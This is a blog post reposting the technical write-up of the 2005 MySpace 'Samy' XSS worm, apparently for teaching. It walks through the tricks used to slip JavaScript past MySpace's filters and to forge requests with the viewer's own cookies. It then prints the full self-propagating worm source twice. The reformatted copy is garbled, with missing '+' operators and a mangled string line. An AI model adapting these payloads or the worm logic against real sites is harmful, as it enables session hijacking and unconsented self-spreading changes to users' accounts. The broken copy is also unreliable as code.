---
title: 'Security Lesson: MySpace.com JS.spaceHeroWorm'
sticky: 999
comments: true
lang: en
draft: published
type: HEXO/post
sitemap: true
toc: false
tocOpen: true
indexing: true
display_tag_onHome: true
recommendedSection: false
donate: false
swiper: false
geolocation: 'Tokyo, Japan'
copyright: true
mathjax: false
share: true
tags:
  - migrated from rBlogger.2009
categories:
  - Work_仕事
  - Programming_開発
  - Javascript
date: 2012-04-16 16:57:46
---

 http://www.namb.la/popular/tech.html


## Technical explanation of The MySpace Worm
Also called the "Samy worm" or "JS.Spacehero worm"
[Click here to read the entertaining story of the development, release, and ensued hilarity of The MySpace Worm](http://www.namb.la/popular)

Full source code of worm at bottom.

**Please note that this code and explanation was only released __AFTER__ MySpace resolved this.**

None of this would work on MySpace at the time it was released and it will not work now. Otherwise, there would have been mayhem.
Now, let's talk more about the problems encountered, workarounds, and how it worked in general.


1. Myspace blocks a lot of tags. In fact, they only seem to allow `<a>`, `<img>`s, and `<div>`s...maybe a few others (`<embed>`'s, 
I think). They wouldn't allow `<script>`s, `<body>`s, onClicks, onAnythings, href's with javascript, etc...However, some browsers (IE, some versions of Safari, others) allow javascript within CSS tags. We needed javascript to get any of this to even work.

**Example**: ```<div style="background:url('javascript:alert(1)')">```


2. We couldn't use quotes within the div because we had already used up single quotes and double quotes already. This made coding JS very difficult. In order to get around it, we used an expression to store the JS and then executed it by name.

**Example**: ```<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">```


3. Sweet! Now we can do javascript with single quotes. However, myspace strips out the word "javascript" from ANYWHERE. To get around this, some browsers will actually interpret "java\nscript" as "javascript" (that's java&lt;NEWLINE&gt;script).

**Example**: ```<div id="mycode" expr="alert('hah!')" style="background:url('java\nscript:eval(document.all.mycode.expr)')">```


4. Okay, while we do have single quotes working, we sometimes NEED double quotes. We'll just escape quotes, e.g., "foo\"bar". Myspace got me...they STRIP OUT all escaped quotes, whether single or double. However, we can just convert decimal to ASCII in javascript to actually produce the quotes.

**Example**: ```<div id="mycode" expr="alert('double quote: '   String.fromCharCode(34))" style="background:url('javascript:eval(document.all.mycode.expr)')">```


5. In order to post the code to the user's profile who is viewing it, we need to actually get the source of the page. Ah, we can use `document.body.innerHTML` in order to get the page source which includes, in only one spot, the ID of the user viewing the page. Myspace gets me again and strips out the word "innerHTML" anywhere. To avoid this, we use an eval() to evaluate two strings and put them together to form "innerHTML".

**Example**: ```alert(eval('document.body.inne' + 'rHTML'));```


6. Time to actually access other pages. We would use iframes, but usually (even when hidden), iframes aren't as useful and are more obvious to the user that "something else" is going on. So, we use AJAX (XML-HTTP) in order for the actual client to make HTTP GETs and POSTs to pages. However, myspace strips out the word "onreadystatechange" which is necessary for XML-HTTP requests. Again, we can use an eval to evade this. Another plus to XML-HTTP is that the necessary cookies required to perform actions on myspace are passed along without any hassle.

**Example**: ```eval('xmlhttp.onread'   'ystatechange = callback');```


7. Time to perform a GET on the user's profile so that we can get their current list of heroes. We don't want to remove any heroes, we just want to append myself to their pre-existing list of heroes. If we GET their profile, we can grab their heroes and store it for later. With all the above figured out, this is simple with an XML-HTTP request except that we have to get the friend ID of the actual user viewing a profile. Like we said above, we can do this by grabbing the source of the page we're on. However, now we need to perform a search in the page for a specific word to find it. So we perform this search, however if we do this, we may end up finding our actual code since it contains the same exact word we're looking for...because saying "if this page contains 'foo', do this", that will always return true because it can always find foo within the actual code that does the searching. Another eval() with a combination of strings avoids this problem.

**Example**: ```var index = html.indexOf('frien'   'dID');```


8. At this point, we have the list of heroes. First, let's add me as a friend by performing an XML-HTTP POST on the addFriends page. Oh no, this doesn't work! Why not? We're on profile.myspace.com, however the POSTing needs to be done on www.myspace.com. No big deal, however XML-HTTP won't allow GETs/POSTs to sites with a different domain name. To get around this, let's actually go to the same URL but on www.myspace.com. You can still view profiles from www.myspace.com, so reloading the page on the domain we want to be on allows us to do the POST.

**Example**: 
```javascript
if (location.hostname == 'profile.myspace.com') document.location = 'http://www.myspace.com' + location.pathname  + location.search;
```


9. Finally we can do a POST! However, when we send the post it never actually adds a friend. Why not? Myspace generates a random hash on a pre-POST page (for example, the "Are you sure you want to add this user as a friend" page). If this hash is not passed along with the POST, the POST is not successful. To get around this, we mimic a browser and send a GET to the page right before adding the user, parse the source for the hash, then perform the POST while passing the hash.


10. Once the POST is complete, we also want to add a hero and the actual code. The code will end up going into the same place where the hero goes so we'll only need one POST for this. However, we need to pre-GET a page in order to get a new hash. But first we have to actually reproduce the code that we want to POST. The easiest way to do this is to actually grab the source of the profile we're on, parse out the code, and then POST. This works except now all sorts of things are garbled! Ah, we need to URL-encode/escape the actual code in order to POST it properly. Weird, still doesn't work. Apparently javascript's URL-encoding and `escape()` function doesn't escape everything necessary so we'll need to manually do some replacing here in order to get the necessary data escaped. We add a little "but most of all, samy is my hero." to the mix, append all the code right after, and voila. We have self-reproducing code, a worm if you will.


11. Other limits, such as a maximum length, imposed other problems and required tight code, no spaces, obfuscated names, reusable functions, etc..


There were a few other complications and things to get around. This was not by any means a straight forward process, and none of this was meant to cause any damage or piss anyone off. This was in the interest of..interest. It was interesting and fun!


**And in the end, there was code:**

```javascript
<div id=mycode style="BACKGROUND: url('java\nscript:eval(document.all.mycode.expr)')" expr="var 
B=String.fromCharCode(34);var A=String.fromCharCode(39);function g(){var
 
C;try{var 
D=document.body.createTextRange();C=D.htmlText}catch(e){}if(C){return 
C}else{return 
eval('document.body.inne' 'rHTML')}}function 
getData(AU){M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')}function
 
getQueryParams(){var E=document.location.search;var 
F=E.substring(1,E.length).split('&');var AS=new Array();for(var 
O=0;O<F.length;O  ){var I=F[O].split('=');AS[I[0]]=I[1]}return AS}var
 J;var AS=getQueryParams();var L=AS['Mytoken'];var 
M=AS['friendID'];if(location.hostname=='profile.myspace.com'){document.location='http://www.myspace.com' location.pathname location.search}else{if(!M){getData(g())}main()}function
 
getClientFID(){return findIn(g(),'up_launchIC( ' A,A)}function 
nothing(){}function paramsToString(AV){var N=new 
String();var O=0;for(var P in AV){if(O>0){N ='&'}var 
Q=escape(AV[P]);while(Q.indexOf(' ')!=-1){Q=Q.replace(' ','+')}while(Q.indexOf('&')!=-1){Q=Q.replace('&','&')}N =P '=' Q;O  }return
 
N}function httpSend(BH,BI,BJ,BK){if(!J){return 
false}eval('J.onr' 'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST'){J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)}J.send(BK);return
 
true}function findIn(BF,BB,BC){var R=BF.indexOf(BB) BB.length;var 
S=BF.substring(R,R 1024);return 
S.substring(0,S.indexOf(BC))}function getHiddenParameter(BF,BG){return 
findIn(BF,'name=' B BG B ' value=' B,B)}function 
getFromURL(BF,BG){var T;if(BG=='Mytoken'){T=B}else{T='&'}var 
U=BG '=';var V=BF.indexOf(U) U.length;var 
W=BF.substring(V,V 1024);var X=W.indexOf(T);var 
Y=W.substring(0,X);return Y}function getXMLObj(){var 
Z=false;if(window.XMLHttpRequest){try{Z=new 
XMLHttpRequest()}catch(e){Z=false}}else 
if(window.ActiveXObject){try{Z=new 
ActiveXObject('Msxml2.XMLHTTP')}catch(e){try{Z=new 
ActiveXObject('Microsoft.XMLHTTP')}catch(e){Z=false}}}return Z}var 
AA=g();var AB=AA.indexOf('m' 'ycode');var 
AC=AA.substring(AB,AB 4096);var AD=AC.indexOf('D' 'IV');var 
AE=AC.substring(0,AD);var 
AF;if(AE){AE=AE.replace('jav' 'a',A 'jav' 'a');AE=AE.replace('exp' 'r)','exp' 'r)' A);AF='
 but 
most of all, samy is my hero. <d' 'iv id=' AE 'D' 'IV>'}var 
AG;function getHome(){if(J.readyState!=4){return}var 
AU=J.responseText;AG=findIn(AU,'P' 'rofileHeroes','</td>');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1){if(AF){AG =AF;var
 
AR=getFromURL(AU,'Mytoken');var AS=new 
Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken=' AR,postHero,'POST',paramsToString(AS))}}}function
 
postHero(){if(J.readyState!=4){return}var AU=J.responseText;var 
AR=getFromURL(AU,'Mytoken');var AS=new 
Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken=' AR,nothing,'POST',paramsToString(AS))}function
 
main(){var AN=getClientFID();var 
BH='/index.cfm?fuseaction=user.viewProfile&friendID=' AN '&Mytoken=' L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken=' L,processxForm,'GET')}function
 
processxForm(){if(xmlhttp2.readyState!=4){return}var 
AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var 
AR=getFromURL(AU,'Mytoken');var AS=new 
Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to
 
Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken=' AR,nothing,'POST',paramsToString(AS))}function
 
httpSend2(BH,BI,BJ,BK){if(!xmlhttp2){return 
false}eval('xmlhttp2.onr' 'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST'){xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)}xmlhttp2.send(BK);return
 
true}"></DIV>
```


<b>-samy</b>

Back to <a href="http://www.namb.la/popular">The MySpace Worm story</a>



```javascript
eval(document.all.mycode.expr);

var B = String.fromCharCode(34);
var A = String.fromCharCode(39);

function g() {
	var C;
	try {
		var D = document.body.createTextRange();
		C = D.htmlText
	} catch (e) {}
	if (C) {
		return C
	} else {
		return eval('document.body.inne'  + 'rHTML')
	}
}
function getData(AU) {
	M = getFromURL(AU, 'friendID');
	L = getFromURL(AU, 'Mytoken')
}
function getQueryParams() {
	var E = document.location.search;
	var F = E.substring(1, E.length).split('&');
	var AS = new Array();
	for (var O = 0; O < F.length; O  ) {
		var I = F[O].split('=');
		AS[I[0]] = I[1]
	}
	return AS
}
var J;
var AS = getQueryParams();
var L = AS['Mytoken'];
var M = AS['friendID'];
if (location.hostname == 'profile.myspace.com') {
	document.location = 'http://www.myspace.com' +  location.pathname  + location.search
} else {
	if (!M) {
		getData(g())
	}
	main()
}
function getClientFID() {
	return findIn(g(), 'up_launchIC( '   A, A)
}
function nothing() {}
function paramsToString(AV) {
	var N = new String();
	var O = 0;
	for (var P in AV) {
		if (O > 0) {
			N  = '&'
		}
		var Q = escape(AV[P]);
		while (Q.indexOf(' ') != -1) {
			Q = Q.replace(' ', '+')
		}
		while (Q.indexOf('&') != -1) {
			Q = Q.replace('&', '&')
		}
		N  = P   '='   Q;
		O  
	}
	return N
}
function httpSend(BH, BI, BJ, BK) {
	if (!J) {
		return false
	}
	eval('J.onr'   'eadystatechange=BI');
	J.open(BJ, BH, true);
	if (BJ == 'POST') {
		J.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		J.setRequestHeader('Content-Length', BK.length)
	}
	J.send(BK);
	return true
}
function findIn(BF, BB, BC) {
	var R = BF.indexOf(BB)   BB.length;
	var S = BF.substring(R, R   1024);
	return S.substring(0, S.indexOf(BC))
}
function getHiddenParameter(BF, BG) {
	return findIn(BF, 'name='   B   BG   B   ' value='   B, B)
}
function getFromURL(BF, BG) {
	var T;
	if (BG == 'Mytoken') {
		T = B
	} else {
		T = '&'
	}
	var U = BG   '=';
	var V = BF.indexOf(U)   U.length;
	var W = BF.substring(V, V   1024);
	var X = W.indexOf(T);
	var Y = W.substring(0, X);
	return Y
}
function getXMLObj() {
	var Z = false;
	if (window.XMLHttpRequest) {
		try {
			Z = new XMLHttpRequest()
		} catch (e) {
			Z = false
		}
	} else if (window.ActiveXObject) {
		try {
			Z = new ActiveXObject('Msxml2.XMLHTTP')
		} catch (e) {
			try {
				Z = new ActiveXObject('Microsoft.XMLHTTP')
			} catch (e) {
				Z = false
			}
		}
	}
	return Z
}
var AA = g();
var AB = AA.indexOf('m'   'ycode');
var AC = AA.substring(AB, AB   4096);
var AD = AC.indexOf('D'   'IV');
var AE = AC.substring(0, AD);
var AF;
if (AE) {
	AE = AE.replace('jav'   'a', A   'jav'   'a');
	AE = AE.replace('exp'   'r)', 'exp'   'r)'   A);
	AF = ' but most of all, samy is my hero. <d'  ="" 'iv="" id="   AE   " d'="">'
}
var AG;

function getHome() {
	if (J.readyState != 4) {
		return
	}
	var AU = J.responseText;
	AG = findIn(AU, 'P'   'rofileHeroes', '');
	AG = AG.substring(61, AG.length);
	if (AG.indexOf('samy') == -1) {
		if (AF) {
			AG  = AF;
			var AR = getFromURL(AU, 'Mytoken');
			var AS = new Array();
			AS['interestLabel'] = 'heroes';
			AS['submit'] = 'Preview';
			AS['interest'] = AG;
			J = getXMLObj();
			httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken='   AR, postHero, 'POST', paramsToString(AS))
		}
	}
}
function postHero() {
	if (J.readyState != 4) {
		return
	}
	var AU = J.responseText;
	var AR = getFromURL(AU, 'Mytoken');
	var AS = new Array();
	AS['interestLabel'] = 'heroes';
	AS['submit'] = 'Submit';
	AS['interest'] = AG;
	AS['hash'] = getHiddenParameter(AU, 'hash');
	httpSend('/index.cfm?fuseaction=profile.processInterests&Mytoken='   AR, nothing, 'POST', paramsToString(AS))
}
function main() {
	var AN = getClientFID();
	var BH = '/index.cfm?fuseaction=user.viewProfile&friendID='   AN   '&Mytoken='   L;
	J = getXMLObj();
	httpSend(BH, getHome, 'GET');
	xmlhttp2 = getXMLObj();
	httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken='   L, processxForm, 'GET')
}
function processxForm() {
	if (xmlhttp2.readyState != 4) {
		return
	}
	var AU = xmlhttp2.responseText;
	var AQ = getHiddenParameter(AU, 'hashcode');
	var AR = getFromURL(AU, 'Mytoken');
	var AS = new Array();
	AS['hashcode'] = AQ;
	AS['friendID'] = '11851658';
	AS['submit'] = 'Add to Friends';
	httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken='   AR, nothing, 'POST', paramsToString(AS))
}
function httpSend2(BH, BI, BJ, BK) {
	if (!xmlhttp2) {
		return false
	}
	eval('xmlhttp2.onr'   'eadystatechange=BI');
	xmlhttp2.open(BJ, BH, true);
	if (BJ == 'POST') {
		xmlhttp2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlhttp2.setRequestHeader('Content-Length', BK.length)
	}
	xmlhttp2.send(BK);
	return true
}
</d'>


```